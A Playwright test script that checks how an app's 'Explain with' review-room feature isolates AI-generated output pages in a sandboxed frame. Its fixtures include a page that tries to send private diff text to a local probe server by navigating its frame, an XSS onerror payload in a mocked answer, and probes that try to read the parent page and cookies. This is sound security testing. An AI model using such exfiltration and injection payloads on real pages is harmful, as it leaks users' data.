import "./lib/isolated-env.mjs"; // first: tests never read the operator's .env
// "Explain with" on the page (public/review-explain.js, docs/units/review-room.md): the header's picker (the tutor and the
// captain's library skill), the paid run's confirmation, the background run's progress and Stop, the output in a sandboxed
// frame served by a real Studio under the output CSP (the page in it cannot fetch, cannot read Studio, has working storage),
// boxing a region (the frame's helper says what lies there) and a follow-up that carries it, the answer with its citations and
// the new version in the rail, an older version, a video paused at a frame. A real isolated Studio serves the skill import,
// the capability and the version's page; the room and the paid runs are answered by the test: nothing paid runs.
//        node tests/review-room-explain-ui.mjs
import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { freePort, waitUp, withSession } from "./boot.mjs";
const here = dirname(fileURLToPath(import.meta.url)), root = join(here, "..");
const { chromium } = await import(process.env.PLAYWRIGHT_MODULE || "playwright").catch(() => {
  console.error("review-room-explain-ui: Playwright not found; set PLAYWRIGHT_MODULE to its index.mjs or install it"); process.exit(2); });
process.env.CREW_SESSION_TOKEN ??= "test-session";
const tmp = mkdtempSync(join(tmpdir(), "crew-explain-ui-")), data = join(tmp, "data"); mkdirSync(data);
const port = await freePort();
const sha = (b) => createHash("sha256").update(b).digest("hex");
// a made-up pull request's room, seeded on disk: what the explainer's own routes (the capability, the page) read
const REPO = "sample-org/money-kit", ID = `PR-${sha(REPO).slice(0, 12)}-7`, H = "a".repeat(40), B = "b".repeat(40);
const prDir = join(data, "review-room", "pr"), xdir = join(prDir, `${ID}-explain`); mkdirSync(xdir, { recursive: true });
writeFileSync(join(prDir, `${ID}.json`), JSON.stringify({ schema: 1, run: "", card: ID, node: "", head: H, base: B, turns: [], board: [], sources: [], check: { questions: [] },
  subject: { kind: "pr", room: ID, url: `https://github.com/${REPO}/pull/7`, repository: REPO, number: 7, project: null, task: null },
  pr: { title: "Add percent", body: "", state: "open", merged: false, mergedAt: null, closedAt: null, draft: false, author: "someone", headRef: "percent", headRepo: REPO, baseRef: "main", head: H, base: B, files: [], notes: [], checkedAt: "2026-11-01T10:00:00Z", truncated: false } }));
const page = (n, extra = "") => `<!doctype html><html><head><meta charset="utf-8"><title>percent, step by step</title><style>body{font:16px system-ui;margin:24px}svg rect{fill:#e9effd;stroke:#2f5bd3}</style></head><body>
<h1>How percent works (v${n})</h1>
<h2 id="s1">Step 1 · rounding</h2>
<svg width="420" height="140"><g data-node="round"><rect x="10" y="10" width="200" height="80" rx="8"></rect><text x="30" y="55">Math.round</text></g></svg>${extra}
<p id="probe">probing</p><img id="px" src="/api/review-room" alt="">
<script>(async()=>{const o=[];try{localStorage.setItem('walk-lang','zh');o.push('storage:'+localStorage.getItem('walk-lang'))}catch(e){o.push('storage:throws')}
try{void parent.document.title;o.push('parent:read')}catch(e){o.push('parent:blocked')}
try{await fetch('/api/review-room');o.push('fetch:ok')}catch(e){o.push('fetch:blocked')}
try{await fetch('http://127.0.0.1:${port}/api/instance');o.push('abs:ok')}catch(e){o.push('abs:blocked')}
try{o.push('cookie:'+(document.cookie?'some':'none'))}catch(e){o.push('cookie:throws')}
o.push('origin:'+self.origin);document.getElementById('probe').textContent=o.join(' ')})();</script></body></html>`;
const probePort = await freePort(), probeHits = [];
const files = { 1: { "index.html": page(1) }, 2: { "index.html": page(2, '<p data-node="half">Halves round up: 2.5 becomes 3.</p>') }, 3: { "clip.mp4": Buffer.from("not really a video") },
  // a page that tries to carry what it holds out by navigating its own frame elsewhere (neither its CSP nor its sandbox stops that)
  4: { "index.html": `<!doctype html><html><head><meta charset="utf-8"><title>leak</title></head><body><h1>private diff text</h1><script>setTimeout(()=>{location='http://127.0.0.1:${probePort}/nav?d='+encodeURIComponent(document.body.textContent)},150)</script></body></html>` } };
const versions = [];
for (const [n, fs] of Object.entries(files)) { mkdirSync(join(xdir, `v${n}`), { recursive: true }); const list = [];
  for (const [p, c] of Object.entries(fs)) { writeFileSync(join(xdir, `v${n}`, p), c); list.push({ path: p, bytes: Buffer.byteLength(c), sha256: sha(c) }); }
  const entry = Object.keys(fs)[0]; versions.push({ n: Number(n), run: Number(n), skill: n === "3" ? { id: "explainer-video", v: 1, name: "explainer-video" } : { id: "walkthrough", v: 1, name: "walkthrough" }, at: `2026-11-01T10:0${n}:00Z`, entry, kind: entry.endsWith(".mp4") ? "video" : "html", files: list, summary: n === "1" ? "One page: percent, step by step" : n === "2" ? "added a note on halves" : "A short video", from: n === "2" ? 1 : null }); }
writeFileSync(join(xdir, "state.json"), JSON.stringify({ schema: 1, selected: { id: "walkthrough", v: 1 }, runs: [], versions }));
// the captain's skill, made up: imported into the library through Studio's own route
const skillDir = join(tmp, "walkthrough"); mkdirSync(skillDir);
writeFileSync(join(skillDir, "SKILL.md"), "---\nname: walkthrough\ndescription: An interactive one-page walkthrough of a change.\n---\n# Walkthrough\n\nWrite index.html.\n");

const { createServer } = await import("node:http");
const probe = createServer((q, res) => { probeHits.push(q.url); res.end("got it"); }); await new Promise((r) => probe.listen(probePort, "127.0.0.1", r));
const env = { ...process.env }; for (const k of ["GITHUB_TOKEN", "GH_TOKEN", "CREW_GITHUB_TOKEN", "ANTHROPIC_API_KEY", "OPENAI_API_KEY"]) delete env[k];
const app = spawn("bun", ["src/server.ts"], { cwd: root, stdio: ["ignore", "pipe", "pipe"], env: { ...env, CREW_PORT: String(port), CREW_GH: "0", CREW_READONLY: "1", CREW_DATA: data,
  CREW_CHAT_PROVIDER: "stub", CREW_RETRO_AUTO: "0", CREW_INSTALL_RUNNER: "mock", CREW_NO_REAL_INSTALL: "1", CREW_GH_NO_CLI: "1", CREW_CLAUDE_BIN: "/nonexistent/claude", CREW_CODEX_BIN: "/nonexistent/codex", HOME: join(tmp, "home"), CREW_MAIN_PROJECT: join(tmp, "proj"), CREW_FILE_ALLOW: tmp } });
let appLog = ""; app.stdout.on("data", (d) => (appLog += d)); app.stderr.on("data", (d) => (appLog += d));
const base = `http://127.0.0.1:${port}`;
await waitUp(base, app);
let pass = 0, fail = 0;
const ok = (c, name, extra = "") => { if (c) { pass++; console.log(`  ok    ${name}`); } else { fail++; console.log(`  FAIL  ${name} ${extra}`); } };
const browser = withSession(await chromium.launch(), base);
const errors = [];
const shots = process.env.ROOM_SHOTS || join(root, "tests/out/review-room-explain"); mkdirSync(shots, { recursive: true });
const ROOM = { card: { id: ID, run: "R-050", node: "review", title: { en: "Pull request #7: Add percent", "zh-TW": "Pull request #7：Add percent" }, status: "open" }, task: { id: "R-050", title: "Add percent" }, pr: { id: "7", url: `https://github.com/${REPO}/pull/7` }, summary: null,
  subject: { kind: "pr", room: ID, url: `https://github.com/${REPO}/pull/7`, repository: REPO, number: 7 }, head: H, base: B, open: true, running: null,
  diffstat: { files: [{ path: "src/percent.ts", added: 4, removed: 0 }], total: { files: 1, added: 4, removed: 0 }, from: "git" },
  offer: { provider: "claude", model: "claude-opus-5", effort: null, paid: true, independence: { level: "vendor", en: "Different vendor from the author.", zh: "和作者不同供應商。" }, hash: "feedc0ffee123456" },
  actions: [{ id: "teach", en: "Teach me", zh: "教我" }], board: [], turns: [{ n: 1, action: "ask", text: "What does it do?", lang: "en", status: "done", provider: "claude", model: "claude-opus-5", answer: "x", claims: [{ text: "It adds a percent function.", kind: "claim", basis: "inference", cites: [] }] }], sources: [], check: { questions: [] }, tutors: [], prState: { state: "open", draft: false, approved: false, checkedAt: "2026-11-01T10:00:00Z", headRepo: REPO, verdicts: [] } };
const OFFER = { kind: "generate", skill: { id: "walkthrough", v: 1, name: "walkthrough" }, provider: "claude", model: "claude-opus-5", effort: null, independence: { level: "vendor", en: "Different vendor from the author.", zh: "和作者不同供應商。" }, paid: true, hash: "c0ffee0000000001", limitMin: 120,
  rounds: { en: "No round cap: the skill keeps going until it is satisfied, you stop it, or the safety limit passes.", zh: "不限輪數" }, materials: { en: ["the diff", "the commits", "reviews and comments"], zh: ["diff", "commit", "review 與留言"] }, expected: null,
  isolation: { en: "The output is shown in an isolated frame: it cannot read Studio or see any token, and cannot fetch or navigate out.", zh: "產出放在隔離框裡顯示" },
  cost: { spent: 0.42, runs: 1, estimate: null }, billing: { en: "Billed to the claude account Studio runs claude with on this Mac (your own sign-in or key).", zh: "由這台 Mac 上 Studio 使用的 claude 帳號付費" } };
const ASK_OFFER = { ...OFFER, kind: "ask", hash: "c0ffee0000000002" };
const run = (n, kind, status, extra = {}) => ({ n, kind, skill: { id: "walkthrough", v: 1, name: "walkthrough", sha256: "x" }, status, by: "captain", at: new Date(Date.now() - 4 * 60_000).toISOString(), ended: status === "running" ? null : new Date().toISOString(), provider: "claude", model: "claude-opus-5", effort: null, confirm: "c", limitMin: 120, rounds: [{ n: 1, job: "J1" }], cost: { usd: 0.42 }, error: null, progress: [], from: null, version: null, ...extra });

try {
  const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 } });
  await ctx.addInitScript(() => { try { localStorage.setItem("crew.lang", "en"); localStorage.setItem("crew.onboarding.journey.dismissed.v1", "1"); } catch {} addEventListener("DOMContentLoaded", () => document.body.classList.add("chat-closed"));
    // no speech in this test (the room's voice controls read the voices; headless Chromium has none)
    Object.defineProperty(window, "speechSynthesis", { configurable: true, value: { getVoices: () => [], speak() {}, cancel() {} } }); window.SpeechSynthesisUtterance = function (t) { this.text = t; };
    window.SpeechRecognition = class { static async available() { return "unavailable"; } start() {} stop() {} }; window.Audio = function (src) { return { src, play: async () => {}, pause() {} }; }; });
  await ctx.route(/^https?:\/\/(?!127\.0\.0\.1)/, (r) => r.abort());
  // the room itself and the paid runs are the test's; the explainer's view too (so its runs can be staged), with the real versions
  let X = { selected: null, skills: [], versions: [], runs: [], running: null, consent: null, log: [], settings: { limitMin: 120 }, busy: false };
  const posts = [];
  await ctx.route(new RegExp(`/api/review-room/${ID}(\\?open=1)?$`), (r) => r.fulfill({ json: ROOM }));
  await ctx.route(new RegExp(`/api/review-room/${ID}/arrive$`), (r) => r.fulfill({ json: {} }));
  await ctx.route(new RegExp(`/api/review-room/${ID}/explain$`), (r) => r.fulfill({ json: X }));
  await ctx.route(new RegExp(`/api/review-room/${ID}/explain/offer\\?`), (r) => { const kind = new URL(r.request().url()).searchParams.get("kind"); r.fulfill({ json: kind === "ask" ? ASK_OFFER : OFFER }); });
  const answer = (r, body, status = 200) => { posts.push([new URL(r.request().url()).pathname.split("/").pop(), JSON.parse(r.request().postData() || "{}")]); r.fulfill({ status, json: body }); };
  let onGenerate = null, onAsk = null, onStop = null, onSelect = null;
  await ctx.route(new RegExp(`/api/review-room/${ID}/explain/(generate|ask|stop|select)$`), (r) => { const op = new URL(r.request().url()).pathname.split("/").pop(); const f = { generate: onGenerate, ask: onAsk, stop: onStop, select: onSelect }[op]; return f ? f(r) : answer(r, X); });
  const p = await ctx.newPage(); p.on("pageerror", (e) => errors.push(e.message));
  // frames' requests: the output page must reach nothing
  // what the output page asked for and really got: a request the browser refused under the page's CSP never completes
  const frameReqs = [], frameBlocked = []; const fromFrame = (q) => { try { const f = q.frame(); return f && f !== p.mainFrame() && !/\/rrx\//.test(q.url()); } catch { return false; } };
  p.on("requestfinished", (q) => { if (fromFrame(q)) frameReqs.push(q.url()); }); p.on("requestfailed", (q) => { if (fromFrame(q)) frameBlocked.push(`${q.url()} ${q.failure()?.errorText}`); });
  await p.goto(`${base}/#/board`); await p.waitForFunction(() => typeof S !== "undefined");
  const imp = await p.evaluate(async (dir) => { const r = await fetch("/api/skills/import", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ kind: "folder", path: dir }) }); return [r.status, await r.text()]; }, skillDir);
  ok(imp[0] === 200, "fixture: the made-up skill is imported into the library", JSON.stringify(imp).slice(0, 300));
  const lib = await p.evaluate(async () => (await (await fetch("/api/skills")).json()).skills.map((s) => ({ id: s.id, name: s.name, description: s.description, v: s.current })));
  const own = await p.evaluate(async () => (await (await fetch("/api/skills")).json()).skills.filter((s) => s.sourceKind !== "builtin").map((s) => s.id));
  X.skills = lib.map((s) => ({ ...s, own: own.includes(s.id) })).sort((a, b) => Number(!a.own) - Number(!b.own));

  // ---------- the picker: the tutor by default; the skill from the library; picking it asks for the paid run ----------
  await p.goto(`${base}/#/room/${ID}`); await p.waitForSelector("[data-explain-picker]", { timeout: 15000 });
  ok(await p.$eval("[data-explain-picker]", (e) => e.dataset.explainPicker === "tutor" && /Explain with\s*Studio tutor/.test(e.textContent)) && !!(await p.$("[data-board]")), "the header's picker reads Studio tutor, and the room is the board as before");
  const place = await p.evaluate(() => { const pk = document.querySelector("[data-explain-picker]"), head = document.querySelector(".rr-head"), fm = document.querySelector("[data-room-firstmate]");
    return { inPills: !!pk.closest(".rr-pills"), inHead: head.contains(pk), beforeFirstmate: !!(pk.compareDocumentPosition(fm) & Node.DOCUMENT_POSITION_FOLLOWING), visible: pk.getBoundingClientRect().width > 80, tutorPill: !!document.querySelector(".rr-pills [data-tutor-open]") }; });
  ok(!place.inPills && place.inHead && place.beforeFirstmate && place.visible, "the picker sits at the header's right end, out of the clipped pills", JSON.stringify(place));
  const pageCsp = await p.evaluate(async () => (await fetch("/")).headers.get("content-security-policy"));
  ok(/frame-src 'self'/.test(pageCsp || ""), "Studio's page frames only its own addresses (frame-src 'self')", pageCsp);
  await p.focus("[data-explain-open]"); await p.keyboard.press("Enter"); await p.waitForSelector("[data-explain-menu]"); await p.waitForTimeout(80);
  ok(await p.evaluate(() => document.activeElement?.closest("[data-explain-menu]") && document.activeElement.dataset.explainSkill === "tutor"), "the menu takes the focus (on the current choice)", await p.evaluate(() => document.activeElement?.outerHTML.slice(0, 80)));
  for (let i = 0; i < 6; i++) await p.keyboard.press("Tab");
  ok(await p.evaluate(() => !!document.activeElement?.closest("[data-explain-menu]")), "Tab stays in the menu");
  const menu = await p.$$eval("[data-explain-menu] > [data-explain-skill]", (es) => es.map((e) => [e.dataset.explainSkill, e.textContent]));
  const more = await p.$eval("[data-explain-more]", (d) => ({ open: d.open, n: d.querySelectorAll("[data-explain-skill]").length, all: [...d.querySelectorAll("[data-explain-skill]")].every((e) => /Studio's library/.test(e.textContent)) }));
  ok(menu.length === 2 && menu[0][0] === "tutor" && /whiteboard/.test(menu[0][1]) && menu[1][0] === "walkthrough" && /your skill/.test(menu[1][1]) && !/new run/.test(menu[1][1]) && more.open === false && more.n > 3 && more.all,
    "the menu: the tutor (whiteboard), the captain's own skill; Studio's library skills folded under More", JSON.stringify({ menu, more }));
  await p.keyboard.press("Escape"); await p.waitForTimeout(80);
  ok(!(await p.$("[data-explain-menu]")) && (await p.evaluate(() => document.activeElement?.hasAttribute("data-explain-open"))), "Esc closes the menu and gives the focus back to the picker");
  await p.click("[data-explain-open]"); await p.waitForSelector("[data-explain-menu]");
  await p.screenshot({ path: join(shots, "1-picker.png") });
  await p.click('[data-explain-skill="walkthrough"]'); await p.waitForSelector("[data-explain-start]:not([disabled])");
  const conf = await p.$eval("[data-explain-confirm]", (e) => e.textContent);
  ok(/claude · claude-opus-5/.test(conf) && /the diff, the commits, reviews and comments/.test(conf) && /No round cap/.test(conf) && /not known yet/.test(conf) && /isolated frame/.test(conf) && (await p.$eval("[data-explain-limit]", (e) => e.value)) === "120", "the confirmation names the model, the materials, rounds, expected time, the safety limit and the isolation", conf);
  ok(/Billed to the claude account/.test(conf) && /this room so far \$0\.420 over 1 run/.test(conf) && /no estimate yet/.test(conf) && /applies to every room/.test(conf), "it says who pays, what this room cost so far, and that the limit applies to every room", conf);
  ok(await p.waitForFunction(() => document.activeElement?.hasAttribute("data-explain-start"), null, { timeout: 2000 }).then(() => true, () => false), "the confirmation takes the focus on Confirm and start");
  await p.screenshot({ path: join(shots, "2-confirm.png") });
  onGenerate = (r) => { X = { ...X, selected: { id: "walkthrough", v: 1 }, running: 1, runs: [run(1, "generate", "running", { progress: [{ at: "t", text: "reading the diff and the commits" }, { at: "t", text: "drawing the rounding figure" }] })], log: [{ ts: "2026-11-01T10:01:00Z", kind: "tool", text: "mat_read {\"path\":\"diff.txt\"}" }] }; answer(r, X); };
  await p.click("[data-explain-start]"); await p.waitForSelector("[data-explain-progress]");
  ok(posts.at(-1)[0] === "generate" && posts.at(-1)[1].skill === "walkthrough" && posts.at(-1)[1].confirm === OFFER.hash, "Confirm and start sends the skill and the exact confirmation", JSON.stringify(posts.at(-1)));
  const prog = await p.$eval("[data-explain-progress]", (e) => e.textContent);
  const steps = await p.$$eval("[data-explain-steps] > li", (es) => es.map((e) => e.className));
  ok(/walkthrough is making the explanation/.test(prog) && /drawing the rounding figure/.test(prog) && /Studio tells you when it is done/.test(prog) && /of the 120 min safety limit/.test(prog) && !!(await p.$("[data-explain-generating]")) && !!(await p.$('[data-explain-progress] [role="progressbar"]')) && steps.join(",") === "done,now,todo,todo",
    "the run shows live progress: done, current and upcoming steps, a bar of the time used, in the stage and in the rail", prog);
  await p.click("[data-explain-log]"); ok(/mat_read/.test(await p.$eval("[data-explain-logtext]", (e) => e.textContent)), "the skill's live log opens");
  await p.screenshot({ path: join(shots, "3-progress.png") });
  onStop = (r) => { X = { ...X, running: null, runs: [run(1, "generate", "stopped", { stop: "stopped by the captain", why: "captain" })] }; answer(r, X); };
  await p.click("[data-explain-stop]"); await p.waitForSelector("[data-explain-empty]");
  const stopped = await p.$eval("[data-explain-empty]", (e) => ({ text: e.textContent, warn: !!e.querySelector('.rx-state.warn[data-explain-ended="captain"] .rx-ic'), again: document.querySelectorAll("[data-explain-again]").length }));
  ok(posts.at(-1)[0] === "stop" && /walkthrough stopped/.test(stopped.text) && /You stopped it\./.test(stopped.text) && !/stopped by the captain/.test(stopped.text) && stopped.warn && stopped.again === 1, "Stop stops it; the stage says so once, as a warning with its icon, with one Try again", JSON.stringify(stopped));
  ok(await p.$eval('[data-explain-run="1"]', (e) => e.classList.contains("warn") && !e.classList.contains("sys")), "the chat's line for it is a warning too, not grey centred text");
  // generate again: this time it finishes (the next read of the room's explainer has v1)
  onGenerate = (r) => { X = { ...X, running: 2, runs: [...X.runs, run(2, "generate", "running")] }; answer(r, X); setTimeout(() => { X = { ...X, running: null, runs: [X.runs[0], run(2, "generate", "done", { version: 1 })], versions: versions.slice(0, 1) }; }, 300); };
  onGenerate = (r) => { X = { ...X, running: 2, runs: [...X.runs, run(2, "generate", "running")] }; answer(r, X); };
  await p.click("[data-explain-again]"); await p.waitForSelector("[data-explain-start]:not([disabled])"); await p.click("[data-explain-start]");
  await p.waitForSelector("[data-explain-progress]");
  const qbox = await p.$eval("[data-explain-q]", (e) => ({ disabled: e.disabled, ph: e.placeholder, send: document.querySelector("[data-explain-send]").textContent }));
  ok(!qbox.disabled && /sent once the output is ready/.test(qbox.ph) && /Ask when ready/.test(qbox.send), "while the first output is made the captain can already ask", JSON.stringify(qbox));
  await p.fill("[data-explain-q]", "What is the gist?"); await p.click("[data-explain-send]"); await p.waitForSelector("[data-explain-queued]");
  ok(!posts.some(([op, b]) => op === "ask" && b.question === "What is the gist?"), "the question waits (nothing paid is asked before there is an output)");
  onAsk = (r) => answer(r, { error: "confirm", code: "confirm_required", offer: ASK_OFFER }, 409);
  X = { ...X, running: null, runs: [X.runs[0], run(2, "generate", "done", { version: 1 })], versions: versions.slice(0, 1) };
  await p.waitForSelector('[data-explain-frame="1"]', { timeout: 10000 }); await p.waitForSelector("[data-explain-askconfirm]", { timeout: 5000 });
  ok(posts.at(-1)[0] === "ask" && posts.at(-1)[1].question === "What is the gist?" && posts.at(-1)[1].version === 1, "once the output is there, the waiting question is asked", JSON.stringify(posts.at(-1)));
  await p.waitForTimeout(80);
  ok(await p.evaluate(() => document.activeElement?.hasAttribute("data-explain-askok")), "the follow-up's confirmation takes the focus");
  await p.click('[data-explain-askconfirm] button:not([data-explain-askok])');
  const live = await p.$eval("[data-explain-q]", (e) => ({ disabled: e.disabled, ph: e.placeholder, send: document.querySelector("[data-explain-send]").disabled }));
  ok(!live.disabled && /Ask about this explanation/.test(live.ph) && !live.send, "the run ended while watching: the ask box and Ask come alive without a reload", JSON.stringify(live));
  const fr = await p.$eval('[data-explain-frame="1"]', (e) => ({ sandbox: e.getAttribute("sandbox"), src: e.getAttribute("src") || "" }));
  ok(fr.sandbox === "allow-scripts" && /^\/rrx\/\d+\.[0-9a-f]{32}\//.test(fr.src), "v1 is shown in a frame with sandbox=allow-scripts only, by a capability URL", JSON.stringify(fr));
  const frame = p.frames().find((f) => /\/rrx\//.test(f.url()));
  await frame.waitForFunction(() => document.getElementById("probe")?.textContent !== "probing", null, { timeout: 10000 });
  const probe = await frame.$eval("#probe", (e) => e.textContent);
  ok(/storage:zh/.test(probe), "the page's localStorage works (Studio's in-memory shim in the opaque origin)", probe);
  ok(/parent:blocked/.test(probe) && /cookie:throws/.test(probe) && /origin:null/.test(probe), "the page cannot read Studio's page nor its cookies: an opaque origin", probe);
  ok(/fetch:blocked/.test(probe) && /abs:blocked/.test(probe), "the page cannot fetch, not even Studio's own address (connect-src 'none')", probe);
  const resp = await p.evaluate(async (u) => { const r = await fetch(u); return { csp: r.headers.get("content-security-policy"), nosniff: r.headers.get("x-content-type-options") }; }, fr.src);
  ok(/^sandbox allow-scripts; default-src 'none'/.test(resp.csp) && /connect-src 'none'/.test(resp.csp) && /img-src data: blob:/.test(resp.csp) && !/allow-same-origin/.test(resp.csp) && resp.nosniff === "nosniff", "the real Studio serves the page with the output CSP", JSON.stringify(resp));
  ok(!frameReqs.length, "nothing the page asked for (a fetch, an image from Studio) was ever answered: only its own document loaded", `${frameReqs.join(",")} | blocked: ${frameBlocked.join(",")}`);
  ok(await frame.$eval("#px", (e) => !e.complete || e.naturalWidth === 0), "an image from Studio's address does not load in it");
  await p.screenshot({ path: join(shots, "4-output.png") });

  // ---------- box a region, ask about it; confirm the follow-up once with "don't ask again"; the answer and v2 ----------
  await p.click("[data-explain-box]"); await p.waitForSelector("[data-explain-overlay]");
  const lb = await p.$eval("[data-x-layer]", (e) => { const b = e.getBoundingClientRect(); return { x: b.left, y: b.top, w: b.width, h: b.height }; });
  await p.mouse.move(lb.x + 4, lb.y + 70); await p.mouse.down(); await p.mouse.move(lb.x + 200, lb.y + 160, { steps: 4 }); await p.mouse.move(lb.x + 420, lb.y + 250, { steps: 4 }); await p.mouse.up();
  await p.waitForSelector('[data-explain-scope="region"]', { timeout: 5000 });
  const scopeText = await p.$eval("[data-x-scope]", (e) => e.textContent);
  ok(/boxed region \(How percent works \(v1\) › Step 1 · rounding\)/.test(scopeText) && /Math\.round/.test(scopeText), "the frame's helper said what lies in the box: the headings and the text", scopeText);
  await p.waitForSelector("[data-x-layer] [data-explain-kept]", { timeout: 3000 }).catch(() => {});
  const kept = await p.evaluate(() => ({ box: !!document.querySelector("[data-x-layer] [data-explain-kept]"), pop: document.querySelectorAll("[data-x-layer] [data-explain-pop] [data-explain-quick]").length, x: !!document.querySelector('[data-explain-scope="region"] [data-explain-clear]'), under: !!document.querySelector(".rx-ask [data-explain-quick]") }));
  ok(kept.box && kept.pop === 4 && kept.x && !kept.under, "the box stays drawn with quick questions beside it; ✕ sits on the About line", JSON.stringify(kept));
  ok(await p.waitForFunction(() => !!document.activeElement?.closest("[data-explain-pop]"), null, { timeout: 2000 }).then(() => true, () => false), "the focus goes into the popover beside the box (not left behind the frame)");
  await p.screenshot({ path: join(shots, "5-boxed.png") });
  onAsk = (r) => { const b = JSON.parse(r.request().postData() || "{}"); if (!b.confirm) return answer(r, { error: "confirm", code: "confirm_required", offer: ASK_OFFER }, 409);
    X = { ...X, running: 3, runs: [...X.runs, run(3, "ask", "running", { question: b.question, selection: b.selection, from: 1, progress: [{ at: "t", text: "reading the figure" }] })] }; answer(r, X);
    setTimeout(() => { X = { ...X, running: null, consent: { plan: ASK_OFFER.hash }, versions: versions.slice(0, 2), runs: [...X.runs.slice(0, -1), run(3, "ask", "done", { question: b.question, selection: b.selection, from: 1, version: 2, answer: 'Rounding happens once, at the end. <img src=x onerror="window.__pwned=1">', cites: ["src/percent.ts:L3", "commit:abc1234"], summary: "added a note on halves" })] }; }, 1500); };
  await p.fill("[data-explain-q]", "Why round here?"); await p.click("[data-explain-send]");
  await p.waitForSelector("[data-explain-askconfirm]");
  const first = posts.at(-1)[1];
  ok(posts.at(-1)[0] === "ask" && first.question === "Why round here?" && first.version === 1 && first.selection?.headings?.includes("Step 1 · rounding") && first.selection.nodes.includes("round") && /Math\.round/.test(first.selection.text) && first.selection.rect?.w > 100 && !first.confirm,
    "the follow-up carries the boxed region: headings, figure ids, text, the rectangle", JSON.stringify(first));
  ok(/paid run on claude · claude-opus-5 with walkthrough/.test(await p.$eval("[data-explain-askconfirm]", (e) => e.textContent)), "a follow-up asks for its paid run's confirmation, in the chat");
  await p.check("[data-explain-consent]"); await p.click("[data-explain-askok]");
  await p.waitForSelector('[data-explain-answer="3"][data-status="running"]', { timeout: 5000 });
  const busy = await p.evaluate(() => ({ send: document.querySelector("[data-explain-send]").disabled, box: document.querySelector("[data-explain-box]").disabled, why: document.querySelector("[data-x-askrow]").textContent }));
  ok(busy.send && busy.box && /Wait for the answer/.test(busy.why), "while the follow-up runs, Ask and Box wait and say why", JSON.stringify(busy));
  await p.waitForSelector('[data-explain-answer="3"][data-status="done"]', { timeout: 10000 });
  ok(posts.at(-1)[1].confirm === ASK_OFFER.hash && posts.at(-1)[1].consent === true && posts.at(-1)[1].selection?.nodes?.includes("round"), "confirmed with “don't ask again”: the same question goes with the confirmation and the consent", JSON.stringify(posts.at(-1)[1]));
  const ans = await p.$eval('[data-explain-answer="3"]', (e) => ({ text: e.textContent, cites: [...e.querySelectorAll("[data-explain-cite]")].map((c) => c.textContent), upd: e.querySelector("[data-explain-updated]")?.textContent, img: !!e.querySelector("img") }));
  ok(ans.cites.join("|") === "src/percent.ts:L3|commit:abc1234" && /output is now v2: added a note on halves/.test(ans.upd) && /onerror/.test(ans.text) && !ans.img && !(await p.evaluate(() => window.__pwned)), "the answer shows its citations and says the output is now v2; the model's text stays text", JSON.stringify(ans));
  ok(/▭ Step 1 · rounding/.test(await p.$eval('[data-explain-q-run="3"]', (e) => e.textContent)), "the question in the chat shows what was boxed");
  await p.waitForSelector('[data-explain-frame="2"]', { timeout: 5000 });
  ok(await p.$$eval("[data-explain-version]", (es) => es.map((e) => e.dataset.explainVersion).join(",")) === "1,2" && (await p.$eval('[data-explain-version="2"]', (e) => e.classList.contains("on"))), "v2 is in the rail and shown");
  await p.screenshot({ path: join(shots, "6-answer-v2.png") });
  await p.click('[data-explain-version="1"]'); await p.waitForSelector('[data-explain-frame="1"]');
  ok(await p.$eval('[data-explain-version="1"]', (e) => e.classList.contains("on")), "an older version is viewable again");
  await p.focus("[data-explain-box]"); await p.keyboard.press("Enter"); await p.waitForSelector("[data-explain-overlay]"); await p.waitForTimeout(80);
  ok(await p.evaluate(() => document.activeElement?.hasAttribute("data-explain-overlay")), "the box mode takes the focus");
  await p.keyboard.press("Enter"); await p.waitForSelector('[data-explain-scope="region"]', { timeout: 5000 });
  ok(/Step 1 · rounding/.test(await p.$eval("[data-x-scope]", (e) => e.textContent)), "Enter boxes what is in view: a keyboard way to ask about a region");
  await p.click("[data-explain-clear]"); await p.waitForSelector('[data-explain-scope="all"]'); await p.waitForTimeout(100);
  ok(!(await p.$("[data-x-layer] [data-explain-kept]")), "✕ clears the box");

  // ---------- a video output: pause at a frame and ask ----------
  X = { ...X, versions };
  await p.evaluate(() => window.crewRoomExplain.load(S.route.arg)); await p.waitForSelector('[data-explain-version="3"]');
  onSelect = (r) => { const b = JSON.parse(r.request().postData() || "{}"); X = { ...X, selected: b.skill ? { id: b.skill, v: 1 } : null }; answer(r, X); };
  await p.click('[data-explain-version="3"]'); await p.waitForSelector("[data-explain-video]"); await p.waitForSelector("[data-explain-pause]");
  ok(posts.at(-1)[0] === "select" && posts.at(-1)[1].skill === "explainer-video" && (await p.$eval("[data-explain-picker]", (e) => e.dataset.explainPicker)) === "explainer-video" && (await p.$eval("[data-explain-skillname]", (e) => e.textContent)) === "explainer-video",
    "showing another skill's version switches the room to that skill: header and chat name it", JSON.stringify(posts.at(-1)));
  ok(/\/explain\/media\/3\/clip\.mp4$/.test(await p.$eval("[data-explain-video]", (e) => e.getAttribute("src"))), "a video is shown in Studio's own player");
  await p.click("[data-explain-pause]"); await p.waitForSelector('[data-explain-scope="frame"]');
  onAsk = (r) => answer(r, X);
  await p.fill("[data-explain-q]", "What is this step?"); await p.click("[data-explain-send]"); await p.waitForTimeout(300);
  ok(posts.at(-1)[0] === "ask" && posts.at(-1)[1].version === 3 && posts.at(-1)[1].selection?.time === 0 && !posts.at(-1)[1].confirm, "paused at a frame, the follow-up sends its time (and needs no confirmation once agreed)", JSON.stringify(posts.at(-1)[1]));
  onAsk = (r) => answer(r, { error: "A turn is already running in this room / 這個審查室已有一回合在進行", code: "busy" }, 409);
  await p.fill("[data-explain-q]", "Again?"); await p.click("[data-explain-send]"); await p.waitForSelector("[data-explain-error]");
  const er = await p.$eval("[data-explain-error]", (e) => ({ text: e.textContent, err: e.classList.contains("err") }));
  ok(er.err && /A turn is already running in this room/.test(er.text) && !/這個審查室/.test(er.text), "a refusal shows in the captain's language only, as an error", JSON.stringify(er));

  // ---------- a page that tries to navigate itself out of Studio ----------
  onSelect = (r) => { const b = JSON.parse(r.request().postData() || "{}"); X = { ...X, selected: b.skill ? { id: b.skill, v: 1 } : null }; answer(r, X); };
  await p.click('[data-explain-version="4"]'); await p.waitForSelector('[data-explain-frame="4"]'); await p.waitForTimeout(2000);
  ok(!probeHits.length, "the output cannot carry anything out by navigating its frame: Studio's page refuses frames outside Studio", probeHits.join(","));

  // ---------- a run that ends while the captain is elsewhere: Studio says so ----------
